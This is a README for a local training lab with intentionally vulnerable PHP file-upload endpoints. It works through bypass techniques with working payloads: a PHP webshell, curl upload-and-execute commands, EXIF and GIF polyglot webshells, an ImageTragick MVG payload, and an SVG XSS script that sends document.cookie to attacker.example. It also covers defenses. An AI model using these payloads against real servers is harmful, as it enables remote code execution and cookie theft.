# upload-basic

The companion lab for TechEarl's file-upload vulnerabilities spoke article and its variant deep dives (extension blacklist, MIME bypass, double extension, and the image-polyglot webshell). A small PHP app with seven endpoints, each demonstrating a different way "we validated the upload" fails (or holds) in production.

## Endpoints

| Endpoint | Validation | Stored under | Bypass |
|---|---|---|---|
| `/upload-naive.php` | None | `/uploads/naive/` | Upload `shell.php` directly |
| `/upload-blacklist.php` | Case-sensitive blacklist of `php`, `phtml`, `php3`, `php4` | `/uploads/blacklist/` | `shell.phar` (the lab's Apache config maps `.phar` to mod_php; the blacklist forgot to block it) |
| `/upload-mime.php` | Client-supplied `Content-Type` must be `image/jpeg` | `/uploads/mime/` | Send `.php` with a forged multipart `Content-Type: image/jpeg` |
| `/upload-double-ext.php` | Trailing extension blacklist (case-insensitive), but the upload directory uses `AddHandler` | `/uploads/double-ext/` | `shell.php.jpg` (Apache executes any file whose name contains `.php`) |
| `/upload-imgproc.php` | libmagic must report `image/*`, then hands the file to ImageMagick `identify` | `/uploads/imgproc/` | EXIF-embedded PHP polyglot, then trigger via `/view.php` |
| `/view.php?img=<filename>` | `realpath()` + `basename()` constrain to `/uploads/imgproc/`, then `include()` | (renders only) | Polyglot payload in the included file runs as PHP |
| `/upload-strict.php` | Extension allowlist + libmagic + GD re-encode + random name + non-executing dir | `/uploads/strict/` | None of the above land (defended reference) |

## Running

```bash
docker compose up upload-basic
```

From the root of the `techearl-labs` repo. Lab listens on `http://localhost:8083`.

## Tearing down between attempts

```bash
docker compose down -v
```

The `-v` flag drops the named volume so the `uploads/` tree resets to empty. Without it, uploaded files persist across restarts (sometimes useful when iterating on a payload, otherwise just confusing).

## Expected exploit paths

The companion articles use the following one-line webshell as `shell.php`:

```php
<?php echo shell_exec($_GET['c'] ?? 'id'); ?>
```

### 1. Naive

```bash
curl -F 'file=@shell.php' http://localhost:8083/upload-naive.php
curl 'http://localhost:8083/uploads/naive/shell.php?c=id'
```

### 2. Blacklist (forgotten extension)

```bash
curl -F 'file=@shell.php;filename=shell.phar' http://localhost:8083/upload-blacklist.php
curl 'http://localhost:8083/uploads/blacklist/shell.phar?c=id'
```

The blacklist blocks `php`, `phtml`, `php3`, `php4` but forgets `phar`. The lab's Apache config explicitly adds `.phar` to the PHP handler (a realistic misconfiguration: PHAR support gets enabled for a tool that needs it and the upload-handler blacklist never gets updated to match). On stock Apache without the `.phar` handler the upload still succeeds, but the file is served as plain text rather than executed; the bypass therefore depends on the server adding `.phar` (or `.pht`, `.phtml` if those are not also blacklisted) to its executable-extension list.

The case-flip variant `shell.phP` works only on Apache builds where the extension match is case-insensitive. Stock `mod_php` on Debian-based images is case-sensitive (matches `\.php$` literally), so the case-flip does not bypass against this lab; the canonical real-world bypass against this validation pattern is the forgotten extension.

### 3. MIME (forged Content-Type)

```bash
curl -F 'file=@shell.php;type=image/jpeg' http://localhost:8083/upload-mime.php
curl 'http://localhost:8083/uploads/mime/shell.php?c=id'
```

The `;type=image/jpeg` segment is the attacker-controlled MIME claim that PHP exposes as `$_FILES['file']['type']`.

### 4. Double extension (AddHandler misconfiguration)

```bash
cp shell.php shell.php.jpg
curl -F 'file=@shell.php.jpg' http://localhost:8083/upload-double-ext.php
curl 'http://localhost:8083/uploads/double-ext/shell.php.jpg?c=id'
```

The validator sees the trailing extension as `jpg` and accepts. Apache's `AddHandler application/x-httpd-php .php` fires on any filename that contains a `.php` segment, regardless of position, so the request hits mod_php and the shell executes. The `.htaccess` in `public/uploads/double-ext/` is what enables this; replacing the directive with `SetHandler application/x-httpd-php` (and only mapping it to the explicit trailing extension via a `<FilesMatch>` block) closes the path.

### 5. Image-EXIF polyglot, triggered via include()

Build a JPEG with PHP in the EXIF Comment field, upload it, then trigger via `/view.php`:

```bash
# Start from any real JPEG.
cp seed.jpg shell.jpg
exiftool -overwrite_original -Comment='<?php system($_GET["c"] ?? "id"); ?>' shell.jpg

# Verify it still parses as a JPEG.
file shell.jpg
# shell.jpg: JPEG image data, JFIF standard 1.01, ... comment: "<?php ...", ...

# Upload. libmagic reports image/jpeg, the magic-byte check passes,
# ImageMagick identify reports the dimensions, the file lands on disk.
curl -F 'file=@shell.jpg' http://localhost:8083/upload-imgproc.php

# Trigger via include().
curl 'http://localhost:8083/view.php?img=shell.jpg&c=id'
# ...uid=33(www-data) gid=33(www-data) groups=33(www-data)...
```

Confirmed working against this lab: the second curl prints `uid=33(www-data) gid=33(www-data) groups=33(www-data)` embedded in the JPEG byte stream.

### 6. GIF89a + appended PHP polyglot

A classic. PHP scans for the opening `<?php` tag and ignores everything before it; GIF parsers accept the leading `GIF89a;` header and treat the trailing PHP bytes as a malformed image trailer:

```bash
printf 'GIF89a;\n<?php system($_GET["c"] ?? "id"); ?>' > shell.gif
file shell.gif
# shell.gif: GIF image data, version 89a, ...

curl -F 'file=@shell.gif' http://localhost:8083/upload-imgproc.php
curl 'http://localhost:8083/view.php?img=shell.gif&c=id'
# ...uid=33(www-data) gid=33(www-data) groups=33(www-data)...
```

Confirmed working against this lab.

### 7. ImageTragick MVG payload (honest framing)

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/test.jpg"|touch /tmp/imagetragick_pwned)'
pop graphic-context
```

The lab image is built on `php:8.2-apache` with the distribution's ImageMagick 7.1.1, whose default `policy.xml` disables the MVG, MSL, HTTPS, URL, and EPHEMERAL coders entirely. Running `identify` against the MVG payload above returns:

```
identify: no decode delegate for this image format `' @ error/constitute.c/ReadImage/746.
```

That is the hardened behaviour. The MVG payload is preserved in the article and in the companion gist as a regression test: on a fresh ImageMagick install it should refuse to load. CVE-2016-3714 is exploitable against vulnerable builds (ImageMagick before 6.9.3-10, 7.x before 7.0.1-1, or any build whose `policy.xml` has been weakened); the lab does not ship one because shipping a vulnerable ImageMagick into a Docker image with apt-get is no longer the default. The companion article frames this honestly rather than claiming an attack the lab does not produce.

### 8. Strict (defended reference)

```bash
curl -F 'file=@shell.jpg' http://localhost:8083/upload-strict.php
# Stored as 0c70cbd0...jpg (re-encoded by GD).

# Confirm the re-encoded file no longer contains the EXIF payload:
docker exec upload-basic sh -c 'grep -ao "<?php" /var/www/html/uploads/strict/0c70cbd0*.jpg || echo "no payload"'
# no payload
```

The GD re-encode reads the decoded pixel data and writes a fresh image file. Any EXIF metadata, appended trailer, or polyglot tail in the original is discarded because GD only writes back what it decoded. The output directory also has `Options -ExecCGI` plus an explicit `RemoveHandler` of every PHP variant, so even a stray executable file in there would not run.

## SVG XSS endpoints (companion to /svg-xss)

Three additional handlers cover the SVG-as-active-document path. They are additive and live alongside the existing endpoints; nothing in the polyglot or extension flow was modified.

| Endpoint | Behaviour | Stored under | Bypass / outcome |
|---|---|---|---|
| `/upload-svg.php` | No sanitisation. Stores under attacker-supplied filename. | `/uploads/svg/` | Upload `evil.svg` containing `<script>alert(document.domain)</script>` |
| `/svg-view.php?f=<name>` | Serves a stored SVG with `Content-Type: image/svg+xml`. No `nosniff`, no `Content-Disposition`. | reads `/uploads/svg/` | Browser parses the response as SVG, runs the embedded `<script>` on this origin |
| `/upload-svg-strict.php` | libmagic sniff, hand-rolled regex scrub of `<script>`, `<foreignObject>`, `on*` handlers, and `javascript:` URIs, random output filename. | `/uploads/svg-strict/` | Payload is stripped before storage |
| `/svg-strict-view.php?f=<name>` | Serves the sanitised SVG with `X-Content-Type-Options: nosniff` and `Content-Disposition: attachment`. | reads `/uploads/svg-strict/` | Browser downloads the file rather than rendering it |

### 9. Working SVG XSS exploit chain

```bash
cat > evil.svg <<'EOF'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="200" height="200" fill="orange"/>
  <script type="text/javascript">
    fetch('//attacker.example/?c=' + document.cookie);
    alert('SVG XSS at ' + document.domain);
  </script>
</svg>
EOF

curl -F 'file=@evil.svg' http://localhost:8083/upload-svg.php
# Stored as evil.svg. View at /svg-view.php?f=evil.svg

curl -sI 'http://localhost:8083/svg-view.php?f=evil.svg'
# Content-Type: image/svg+xml      <-- the active-document trigger
# (no nosniff, no Content-Disposition)

open 'http://localhost:8083/svg-view.php?f=evil.svg'
# Browser renders as SVG, parses <script>, alert fires on origin 127.0.0.1:8083
```

The same payload through `/upload-svg-strict.php` is stored with the `<script>` removed, and `/svg-strict-view.php` sends `nosniff` + `attachment` so even a stray bypass would download rather than render.

> The hand-rolled regex scrub in `/upload-svg-strict.php` is a lab demonstration. In production code use [enshrined/svg-sanitize](https://github.com/darylldoyle/svg-sanitizer) (PHP), [bleach](https://github.com/mozilla/bleach) + `lxml` (Python), or DOMPurify with the `USE_PROFILES.svg` flag (Node / browser). Regex parsing of XML has well-known edge cases; a real parser is the right tool.

## Safety

Bound to `127.0.0.1` by default. Do not expose this container to a public interface. The whole point of the lab is that uploaded code runs on the host inside the container, so a reachable container is a one-request-away RCE for anyone on the network. Tear it down with `docker compose down -v` when you are finished.
